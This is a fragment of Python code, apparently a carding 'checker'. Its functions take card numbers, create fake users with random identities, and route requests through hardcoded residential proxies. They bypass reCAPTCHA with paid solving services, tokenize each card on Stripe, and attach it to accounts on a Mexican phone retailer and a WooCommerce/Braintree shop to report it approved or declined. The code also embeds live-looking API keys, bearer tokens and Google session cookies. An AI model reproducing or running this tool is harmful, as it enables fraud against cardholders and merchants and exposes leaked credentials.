                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': (
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                    'AppleWebKit/537.36 (KHTML, like Gecko) '
                    'Chrome/116.0.0.0 Safari/537.36'
                ),
            }

            data = (
                f'time_on_page=274800'
                f'&pasted_fields=number'
                f'&guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5'
                f'&muid=d51c4248-1542-438c-a89e-99aa38930d3670a15d'
                f'&sid=df3ffd6e-fea6-4b25-b975-ad6ed7512f54c51c17'
                f'&key=pk_live_51KOX42AMlS3RZFNSs08ALhGLqQIZ8hZLlEkBxYlxQo6aJlEcz442oQ7L9Eejs7niMHf6PKYGofk0jIMB78ubKt6D00qp0QZjLC'
                f'&payment_user_agent=stripe.js%2F78ef418'
                f'&card[number]={cc_number}'
                f'&card[cvc]={cvv}'
                f'&card[exp_month]={mes}'
                f'&card[exp_year]={ano_number}'
            )

            response = c.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            responsePm = json.loads(response.text)
           # print(responsePm)
            if 'error' in responsePm and 'message' in responsePm['error']:
                mensaje = responsePm['error']['message']
                return mensaje
            else:
                tokenkst = responsePm['id']
                print(tokenkst)
            

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJmZWNkYzcwNi1lNjVlLTQxM2YtOTI0Mi0yNTQwN2MyMTYyYzgifQ.GZlcAa4ZWFg6jRGJQJ36NjvlhUsT_UNNrNHvQyqxLGI',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://micuenta.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://micuenta.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = {
                'payment_card[card_name]': name+' '+last,
                'payment_card[card_number]': cc_number,
                'payment_card[cvv]': '631',
                'payment_card[expiry_month]': mes,
                'payment_card[expiry_year]': ano_number,
                'payment_card[is_default]': 'false',
                'payment_card[stripe_token]': tokenkst,
                'user_id': id_servicio,
            }

            response = c.post('https://redphone.api.koonolmexico.com/payment_cards', headers=headers, data=data)
            responsePm = json.loads(response.text)
            

           
            if 'message' in responsePm and 'error' in responsePm['message']:
                error_info = responsePm['message']['error']
                mensaje = error_info.get('message', 'Error desconocido')
                decline_code = error_info.get('declinecode', 'Sin código')  # OJO: es 'declinecode', no 'decline_code'
                estado = f"❌ Tarjeta rechazada: {mensaje} | Código: {decline_code}"

            elif 'payment_card' in responsePm and 'created_at' in responsePm['payment_card']:
                created_at = responsePm['payment_card']['created_at']
                estado = f"✅ Aprobado | Creado en: {created_at}"

            else:
                estado = f"❓ Respuesta no reconocida: {responsePm}"

            print(estado)
            return estado




                    
           
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    

def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
    
def generar_numero_usa():
    area_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    central_office_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    line_number = random.randint(1000, 9999)  # XXXX
    
    return f"({area_code})-{central_office_code}-{line_number}"

def print_all_texts(data):
    if isinstance(data, dict):
        # Si existe una clave 'value' que contiene una lista
        if "value" in data and isinstance(data["value"], list):
            for value_item in data["value"]:
                if isinstance(value_item, dict) and "text" in value_item:
                    print(value_item["text"])
        # Continuar buscando en otros niveles
        for key, value in data.items():
            print_all_texts(value)

    elif isinstance(data, list):
        for item in data:
            print_all_texts(item)

import random
def generar_numero_mx():
    # Los números mexicanos móviles tienen 10 dígitos y generalmente empiezan con 55 (para Ciudad de México) o 33 (Guadalajara), etc.
    prefijos = ['55', '33', '81', '44', '77', '55']  # Algunos prefijos comunes de números móviles
    prefijo = random.choice(prefijos)
     # Genera los 8 dígitos restantes de forma aleatoria
    numero = ''.join([str(random.randint(0, 9)) for _ in range(8)])
    # Devuelve el número completo de 10 dígitos
    return prefijo + numero



import urllib3
async def esim(card: str) -> str:
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c =  requests.Session()
            usuariop = "RNET14947_Quituk-zone-resi-asn-AS10279"
            contraseña = "Saiper123"
            host = "us.resiproxies.net"
            puerto = "16666"

            proxy_url = f"http://{usuariop}:{contraseña}@{host}:{puerto}"

            c.proxies = {
                "http": proxy_url,
                "https": proxy_url
            }
                          
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            
            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
            
           

            #============[Requests 1]============#
            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'imei': '353495111910597',
                'sim_card_type': 'embedded',
            }

            response = c.get('https://redphone.api.koonolmexico.com/altan/imei_check', params=params, headers=headers)
            
            time.sleep(2)

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiI2YTkzYjYxNC1lYzE4LTRlMDYtOWY4ZC1kZjhhYTY2NjllOWIifQ.ztwNlAv-V8L0M6qHfB68Q_cXupibSQCFTEguIf6XxTo',
                'cache-control': 'no-cache',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'bundle_id': '24',
            }

            response = c.get('https://redphone.api.koonolmexico.com/sim_cards/sim_cards', params=params, headers=headers)
            time.sleep(2)
            sufijo = ''.join(str(random.randint(0, 9)) for _ in range(3))

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'user': {
                    'signup_status': 'authorized',
                    'name': name,
                    'last_name': last,
                    'maiden_name': '',
                    'email': email,
                    'phone': None,
                    'mobile_phone': '9986326090',
                    'privacy_acceptance': True,
                },
            }

            response = c.post('https://redphone.api.koonolmexico.com/users', headers=headers, json=json_data)
            responsePm = json.loads(response.text)
            user_id = responsePm["user"]["id"]
            print(user_id)

            API_KEY = "bf5a65205366ac960191fd60de67463d"  # 🔴 Reemplázala con tu clave de Anti-Captcha
            SITE_KEY = "6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll"  # 🔹 Sitekey de reCAPTCHA
            URL_OBJETIVO = "https://ecommerce.redphone.com.mx/paso-3"  # 🔹 Página con el reCAPTCHA

            api_key = "faa4893569844da8b6055901f34b8d2f"

            # Datos del sitio
            website_url = "https://ecommerce.redphone.com.mx/paso-3"
            sitekey = "6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll"

            # Paso 1: Crear tarea en 2Captcha
            print("📤 Enviando captcha a 2Captcha...")

            payload = {
                'key': api_key,
                'method': 'userrecaptcha',
                'googlekey': sitekey,
                'pageurl': website_url,
                'json': 1
            }

            response = requests.post('http://2captcha.com/in.php', data=payload)
            task_result = response.json()

            if task_result['status'] != 1:
                print("❌ Error al enviar captcha:", task_result['request'])
                exit()

            captcha_id = task_result['request']
            print("🆔 Tarea creada. ID:", captcha_id)

            # Paso 2: Esperar la solución
            result_url = f"http://2captcha.com/res.php?key={api_key}&action=get&id={captcha_id}&json=1"
            print("⏳ Esperando respuesta...")

            token = None
            for _ in range(20):
                time.sleep(5)
                result_response = requests.get(result_url)
                result_data = result_response.json()

                if result_data['status'] == 1:
                    token = result_data['request']
                    print("✅ CAPTCHA resuelto.")
                    break
                elif result_data['request'] == 'CAPCHA_NOT_READY':
                    print("⏳ Aún sin resolver, esperando...")
                else:
                    print("❌ Error:", result_data['request'])
                    break

            else:
                return("❌ Tiempo de espera agotado.")
                
            
            headers = {
                'authority': 'www.google.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-protobuffer',
                # 'cookie': '__Secure-3PAPISID=RpxSH8Er4vu9_-vw/A7hRrCp8qg6w0Hp6l; __Secure-3PSID=g.a000wwgaJQGIFqZyyZ8fiYmGtaN-k0ywdqQhPz_9vwPsa4s_tw3Oc9XEjsQVK6NIa5l6YdgJ4wACgYKAZsSARYSFQHGX2MiKRq0RsOj3dPcqPHWgWk39RoVAUF8yKqEi0gbPnBaTpKE02yaXaV-0076; __Secure-3PSIDTS=sidts-CjIB5H03P9vV6DU_WK-kQggB0CAHNstHXw9AsE6P8_GuFAU4QtgjQmtoZAYawAMXgCi3FRAA; NID=524=vba3hYVbKOvNwH9UvWJRhbQNPLL96ytIUm_RkQwMC6KOvLc-yeZKX4etIlC7dinv4ePsCfwMlwFwm2tTcx4T6L5i-2n2XfdNW1yjqK0Y3Z86zekcTzjknRAoH-wO96tMs4MCnnUj8dnpeD88h6iQuK8hWvQCo3YzASgU6hc7LoNzYC_F-I6MNN52jifnQprShSDIGTtHXAx-gy5FIlzcYTOQKfwLBRUA_jrMOCOZtmd7eClK31JxT-y2NAzIrlffhJ90wMxMaAqrnglyelKBNEyqCXsyA9fAZyOeAYlUbtmBiJKCPR9pitoO3I7YJthy8GAyx7xYVPTfdceA2cyU7-4yMFv22hf7f6hAzTNuYtNz5khPSLw5VX9gLfcp3gA1wDv4udlJgRPpXLW6f8Vkpk2JOUqP3CKld2yeUMdDq5tF48qLhIRUozmkKtHa2idmAzW0iHxhe0uvFyAF0LAPg1Emb0cJjYr1h-PzBCUcuDJFzFx6otIFvzrVclwv2fTYA-Iry1ecCvhaL2d2NbFKGn51UL37S56-c6NwduMNYI-LA0FJQInTYVYhO_t9L3cQHQ3dCvjIpeg3Mdf-GfdVeJrJx1STgQES2yJSrNapnh1-j_fIGsphbWbK71J8cgtTyYT8Bf48LbV4LpwYwZevhFrZIdGtnaFsjz5nqoDDWJ0F17uqIVVTZ-gu5CVXZUB7vGcVQI8eufd3KyF-PHWil2mf85ihCna8b8wr641Gaqjg0B0-OE6ILe9xVqBSGOR2HKK2-IpxaqIvTZBvX0mPdqSmURV5ntgv82mxcHAGmij279QRptHiXrrPLwVxYuhF0hAbzyHhIM5MMEiN-WYjg1PPH7WhhmkgHBLoDesIDgM4qDiHvx007SUTTuxq8KKXE8sMLgquZgcPjRFHQAPgpd8LTzDj6t6M62ui3xw3dl3Ams67LciRSrEv-Z7mBTm8TNcfWQoN5m163MA-Lll1gseZ9lEIVxGHE8vJwPoJY53QPG4c0hSxgrZaEISVfi9-jVueR3OAc-NwosXAvZXJPBcDADlwmcfwjbx5PL5jxK_fzonCM9BHsXgPAdBthyD2eC3g53vMRQGs_aGWjdFsVI7RdAojzPngfU87lJM1bi8D1A6ytoPmPh1E_T_8mMDbXS9FR08Od4F5j5-v26An2iUutam9i2pg_BIxjw7tMTckYxmJCHdRg7t-A0DQTxCBeGtguAKITwrKchVDu8dTuaGvmwjgqRyLC4UT9BUkZ1mJOCHkCxoXWyHlukzBqDiphi6YzXvAJzBtiGeqQ74YwqUYfzogRi64qtJJVVUHERaYw9PIKayTgnwdUQHiHqQLpB1f-fpfOc2-ufG5d1GgC7wVJHcIGE-94zwP3JEJnTAFG6NrTFIPYJJAUyMbUm5pdxNNI8FDa41Ptp-DjO1qrFFsyt_uJcRWwIDLMQ; __Secure-3PSIDCC=AKEyXzUcz7FlEOTMpOMhQKkFs86fUHKlDmN3yXOk1nnW60AjJ5vP-0L7vquPX_GzauMkcienG3M',
                'origin': 'https://www.google.com',
                'pragma': 'no-cache',
                'referer': 'https://www.google.com/recaptcha/api2/bframe?hl=es&v=GUGrl5YkSwqiWrzO3ShIKDlu&k=6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-client-data': 'CLuIywE=',
            }

            params = {
                'k': '6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
            }

            data = b'\n\x18GUGrl5YkSwqiWrzO3ShIKDlu\x12\xc3\xa4\x0b' + token.encode('utf-8')

            response = requests.post('https://www.google.com/recaptcha/api2/reload', params=params,  headers=headers, data=data)

            headers = {
                'authority': 'www.google.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                # 'cookie': '__Secure-3PAPISID=RpxSH8Er4vu9_-vw/A7hRrCp8qg6w0Hp6l; __Secure-3PSID=g.a000wwgaJQGIFqZyyZ8fiYmGtaN-k0ywdqQhPz_9vwPsa4s_tw3Oc9XEjsQVK6NIa5l6YdgJ4wACgYKAZsSARYSFQHGX2MiKRq0RsOj3dPcqPHWgWk39RoVAUF8yKqEi0gbPnBaTpKE02yaXaV-0076; __Secure-3PSIDTS=sidts-CjIB5H03P9vV6DU_WK-kQggB0CAHNstHXw9AsE6P8_GuFAU4QtgjQmtoZAYawAMXgCi3FRAA; NID=524=vba3hYVbKOvNwH9UvWJRhbQNPLL96ytIUm_RkQwMC6KOvLc-yeZKX4etIlC7dinv4ePsCfwMlwFwm2tTcx4T6L5i-2n2XfdNW1yjqK0Y3Z86zekcTzjknRAoH-wO96tMs4MCnnUj8dnpeD88h6iQuK8hWvQCo3YzASgU6hc7LoNzYC_F-I6MNN52jifnQprShSDIGTtHXAx-gy5FIlzcYTOQKfwLBRUA_jrMOCOZtmd7eClK31JxT-y2NAzIrlffhJ90wMxMaAqrnglyelKBNEyqCXsyA9fAZyOeAYlUbtmBiJKCPR9pitoO3I7YJthy8GAyx7xYVPTfdceA2cyU7-4yMFv22hf7f6hAzTNuYtNz5khPSLw5VX9gLfcp3gA1wDv4udlJgRPpXLW6f8Vkpk2JOUqP3CKld2yeUMdDq5tF48qLhIRUozmkKtHa2idmAzW0iHxhe0uvFyAF0LAPg1Emb0cJjYr1h-PzBCUcuDJFzFx6otIFvzrVclwv2fTYA-Iry1ecCvhaL2d2NbFKGn51UL37S56-c6NwduMNYI-LA0FJQInTYVYhO_t9L3cQHQ3dCvjIpeg3Mdf-GfdVeJrJx1STgQES2yJSrNapnh1-j_fIGsphbWbK71J8cgtTyYT8Bf48LbV4LpwYwZevhFrZIdGtnaFsjz5nqoDDWJ0F17uqIVVTZ-gu5CVXZUB7vGcVQI8eufd3KyF-PHWil2mf85ihCna8b8wr641Gaqjg0B0-OE6ILe9xVqBSGOR2HKK2-IpxaqIvTZBvX0mPdqSmURV5ntgv82mxcHAGmij279QRptHiXrrPLwVxYuhF0hAbzyHhIM5MMEiN-WYjg1PPH7WhhmkgHBLoDesIDgM4qDiHvx007SUTTuxq8KKXE8sMLgquZgcPjRFHQAPgpd8LTzDj6t6M62ui3xw3dl3Ams67LciRSrEv-Z7mBTm8TNcfWQoN5m163MA-Lll1gseZ9lEIVxGHE8vJwPoJY53QPG4c0hSxgrZaEISVfi9-jVueR3OAc-NwosXAvZXJPBcDADlwmcfwjbx5PL5jxK_fzonCM9BHsXgPAdBthyD2eC3g53vMRQGs_aGWjdFsVI7RdAojzPngfU87lJM1bi8D1A6ytoPmPh1E_T_8mMDbXS9FR08Od4F5j5-v26An2iUutam9i2pg_BIxjw7tMTckYxmJCHdRg7t-A0DQTxCBeGtguAKITwrKchVDu8dTuaGvmwjgqRyLC4UT9BUkZ1mJOCHkCxoXWyHlukzBqDiphi6YzXvAJzBtiGeqQ74YwqUYfzogRi64qtJJVVUHERaYw9PIKayTgnwdUQHiHqQLpB1f-fpfOc2-ufG5d1GgC7wVJHcIGE-94zwP3JEJnTAFG6NrTFIPYJJAUyMbUm5pdxNNI8FDa41Ptp-DjO1qrFFsyt_uJcRWwIDLMQ; __Secure-3PSIDCC=AKEyXzVlA924o2D1DWcmAgyuu7cqiM7mgC2cLHf8j2dOz1F9UIYt37lgOhvdzxw-UGm1YVZCCeA',
                'origin': 'https://www.google.com',
                'pragma': 'no-cache',
                'referer': 'https://www.google.com/recaptcha/api2/bframe?hl=es&v=GUGrl5YkSwqiWrzO3ShIKDlu&k=6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-client-data': 'CLuIywE=',
            }

            params = {
                'k': '6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
            }

            data = f'v=GUGrl5YkSwqiWrzO3ShIKDlu&c={token}'

            response = c.post(
                'https://www.google.com/recaptcha/api2/userverify',
                params=params,
               
                headers=headers,
                data=data,
            )

            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = (
                'time_on_page=45967'
                '&pasted_fields=number'
                '&guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5'
                '&muid=830cfac5-04bc-45bf-b039-3d4790e48dfa5b7899'
                '&sid=49eb8764-fc5a-4378-aae7-1bf269668301f5b6cf'
                '&key=pk_live_51KOX42AMlS3RZFNSs08ALhGLqQIZ8hZLlEkBxYlxQo6aJlEcz442oQ7L9Eejs7niMHf6PKYGofk0jIMB78ubKt6D00qp0QZjLC'
                '&payment_user_agent=stripe.js%2F78ef418'
                f'&card[number]={cc_number}'
                f'&card[cvc]={cvv}'
                f'&card[exp_month]={mes}'
                f'&card[exp_year]={ano_number}'
            )

            response = c.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            responsePm = json.loads(response.text)
           
            if "id" in responsePm:
                tokenst = responsePm["id"]
                print(tokenst)
            else:
                return "❌ Usa otra tarjeta o comando"

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'payment_card': {
                    'openpay_token': None,
                    'openpay_device_session_id': 'muIlmGIxdJlmRLS05xGvR9ldhtWBSbOm',
                    'stripe_token': tokenst,
                    'is_default': True,
                    'payment_method': 'card',
                    'identification_number': None,
                    'mercado_pago_token': None,
                },
                'user_id': user_id,
            }

            response = c.post('https://redphone.api.koonolmexico.com/payment_cards', headers=headers, json=json_data)
            time.sleep(2)
            responsePm = json.loads(response.text)
            print(responsePm)
            

            mensaje = ""

            # Verificar si hay un error tipo 'card_declined'
            if 'message' in responsePm and 'error' in responsePm['message']:
                error_info = responsePm['message']['error']
                if error_info.get('code') == 'card_declined':
                    mensaje = f"❌ Tarjeta rechazada: {error_info.get('message', 'Error desconocido')}"
                else:
                    mensaje = f"⚠️ Otro error: {error_info.get('message', 'Error desconocido')}"

            # Verificar si está aprobado por status 'delivered' o 'authorized'
            elif 'altan_service_bundle_order' in responsePm:
                status = responsePm['altan_service_bundle_order'].get('status', '').lower()
                if status in ['delivered', 'authorized']:
                    mensaje = "✅ Aprobado"
                else:
                    mensaje = f"🔄 Estado: {status}"

            # Verificar si existe 'created_at' en payment_card
            elif 'payment_card' in responsePm and 'created_at' in responsePm['payment_card']:
                fecha = responsePm['payment_card']['created_at']
                mensaje = f"✅ Aprobado (Tarjeta registrada correctamente)\n🕒 Fecha de creación: {fecha}"

            # En caso de que no sea ninguno de los anteriores
            else:
                mensaje = f"❓ Respuesta no reconocida: {responsePm}"
            
            print(mensaje)

            return mensaje


            
            
           

          

                    
           
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    
from curl_cffi import requests
from bs4 import BeautifulSoup
import json, base64, re, random, colorama
import ast
import email
from email import message
from tarfile import data_filter
import random, time
from faker import Faker
from random import choice
from tkinter import LAST, Tk, filedialog
from httpx import TooManyRedirects, request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper


correos = [
    'juancarlosmena@gmail.com',
    'saradelosangeles@gmail.com',
    'mariajuarez1@gmail.com',
    'raulrodriguez2@gmail.com',
]

async def Braintree(card: str) -> str:
        
    try:

        card = card.strip()
        cc, mes, ano, cvv = re.findall(r'[0-9]+', card)[:4]
        mes  = '0'+str(int(mes)) if len(mes) == 1 else mes
        ano = f"20{ano}" if len(ano) == 2 else ano
        cvv = cvv[:3] if len(cvv) == 4 and not str(cc).startswith('3') else cvv

        if card.startswith('3'): brand = 'american-express'
        if card.startswith('4'): brand = 'visa'
        if card.startswith('5'): brand = 'master-card'
        if card.startswith('6'): return {'cc': card, 'msg': 'Tarjeta no admitida'}

        correo = random.choice(correos)
       

        
        curl = requests.Session(impersonate='chrome131_android')
        curl.proxies = {'https': 'http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334'}#the proxies?http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334
    


        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        }

        response = curl.get('https://www.gud-shop.com/en/my-account/payment-methods/', headers=headers)
        soup = BeautifulSoup(response.content, 'html.parser')
        print(soup)
        w_nonce = soup.find('input', {'name': 'woocommerce-login-nonce'})['value']
        


        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.gud-shop.com',
            'Referer': 'https://www.gud-shop.com/en/my-account/payment-methods/',
        }

        data = {
        'username': correo,
        'password': correo,
        'woocommerce-login-nonce': w_nonce,
        '_wp_http_referer': '/en/my-account/payment-methods/',
        'login': 'Log in',
        'trp-form-language': 'en'
        }

        response = curl.post('https://www.gud-shop.com/en/my-account/payment-methods/', headers=headers, data=data)


        client_token_nonce = response.text.split('"client_token_nonce":"')[1].split('"')[0]



        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Referer': 'https://www.gud-shop.com/en/my-account/payment-methods/',
        }

        response = curl.get('https://www.gud-shop.com/en/my-account/add-payment-method/', headers=headers)
        soup = BeautifulSoup(response.content, 'html.parser')
        wp_nonce = soup.find('input', {'name': 'woocommerce-add-payment-method-nonce'})['value']




        headers = {
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.gud-shop.com',
            'Referer': 'https://www.gud-shop.com/en/my-account/add-payment-method/',
            }

        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_token_nonce,
        }

        response = curl.post('https://www.gud-shop.com/wp-admin/admin-ajax.php', headers=headers, data=data)
        jwt = response.json()['data']
        bearer = json.loads(base64.b64decode(jwt).decode('utf-8'))['authorizationFingerprint']


        headers = {
            'Accept': '*/*',
            'Authorization': f'Bearer {bearer}',
            'Braintree-Version': '2018-05-10',
            'Origin': 'https://assets.braintreegateway.com',
            'Referer': 'https://assets.braintreegateway.com/',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
